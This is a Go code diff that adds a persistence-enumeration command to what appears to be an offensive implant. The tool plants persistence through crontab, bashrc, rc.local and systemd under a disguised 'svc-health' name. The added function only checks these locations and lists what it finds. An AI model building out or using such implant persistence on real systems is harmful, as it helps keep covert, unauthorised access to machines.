@@ -24,8 +24,10 @@ func persistMethod(method, cmd, name string) (string, error) {
 		return persistSystemd(cmd, name)
 	case "rm", "remove", "uninstall":
 		return persistRemoveLinux(name)
+	case "enum", "check", "list":
+		return persistEnumLinux()
 	default:
-		return "", fmt.Errorf("unknown persistence method: %s (linux: crontab|bashrc|rc.local|systemd)", method)
+		return "", fmt.Errorf("unknown persistence method: %s (linux: crontab|bashrc|rc.local|systemd|enum)", method)
 	}
 }
 
@@ -69,6 +71,104 @@ func persistRemoveLinux(name string) (string, error) {
 		return "", fmt.Errorf("no persistence entries found for name: %s", name)
 	}
 	return "[+] " + strings.Join(removed, "\n[+] "), nil
+}
+
+// persistEnumLinux checks all known Linux persistence mechanisms.
+func persistEnumLinux() (string, error) {
+	var sb strings.Builder
+	sb.WriteString("[*] Scanning persistence mechanisms...\n")
+
+	// Crontab
+	sb.WriteString("\n[Crontab]\n")
+	if out, err := exec.Command("crontab", "-l").Output(); err == nil && len(out) > 0 {
+		sb.Write(out)
+	} else {
+		sb.WriteString("  (empty)\n")
+	}
+
+	// ~/.bashrc
+	sb.WriteString("\n[~/.bashrc]\n")
+	home, _ := os.UserHomeDir()
+	if data, err := os.ReadFile(filepath.Join(home, ".bashrc")); err == nil {
+		found := false
+		for i, l := range strings.Split(string(data), "\n") {
+			if strings.Contains(l, "svc-health") {
+				fmt.Fprintf(&sb, "  line %d: %s\n", i+1, l)
+				found = true
+			}
+		}
+		if !found {
+			sb.WriteString("  (no entries)\n")
+		}
+	} else {
+		sb.WriteString("  (not found)\n")
+	}
+
+	// /etc/rc.local
+	sb.WriteString("\n[/etc/rc.local]\n")
+	if data, err := os.ReadFile("/etc/rc.local"); err == nil {
+		found := false
+		for i, l := range strings.Split(string(data), "\n") {
+			if strings.Contains(l, "svc-health") {
+				fmt.Fprintf(&sb, "  line %d: %s\n", i+1, l)
+				found = true
+			}
+		}
+		if !found {
+			sb.WriteString("  (no entries)\n")
+		}
+	} else {
+		sb.WriteString("  (not found)\n")
+	}
+
+	// Systemd user services
+	sb.WriteString("\n[Systemd user services (~/.config/systemd/user/)]\n")
+	svcDir := filepath.Join(home, ".config", "systemd", "user")
+	if entries, err := os.ReadDir(svcDir); err == nil {
+		found := false
+		for _, e := range entries {
+			if strings.HasSuffix(e.Name(), ".service") {
+				sb.WriteString("  " + e.Name() + "\n")
+				found = true
+			}
+		}
+		if !found {
+			sb.WriteString("  (none)\n")
+		}
+	} else {
+		sb.WriteString("  (none)\n")
+	}
+
+	// Systemd system services (non-standard)
+	sb.WriteString("\n[Systemd system services (/etc/systemd/system/)]\n")
+	standardPrefixes := []string{"systemd", "dbus", "network", "getty", "ssh", "cron", "cups", "avahi", "udev"}
+	if entries, err := os.ReadDir("/etc/systemd/system"); err == nil {
+		found := false
+		for _, e := range entries {
+			n := e.Name()
+			if !strings.HasSuffix(n, ".service") {
+				continue
+			}
+			suspect := true
+			for _, p := range standardPrefixes {
+				if strings.HasPrefix(n, p) {
+					suspect = false
+					break
+				}
+			}
+			if suspect {
+				sb.WriteString("  " + n + "\n")
+				found = true
+			}
+		}
+		if !found {
+			sb.WriteString("  (none non-standard)\n")
+		}
+	} else {
+		sb.WriteString("  (not readable)\n")
+	}
+
+	return sb.String(), nil
 }
 
 func persistCrontab(cmd, name string) (string, error) {
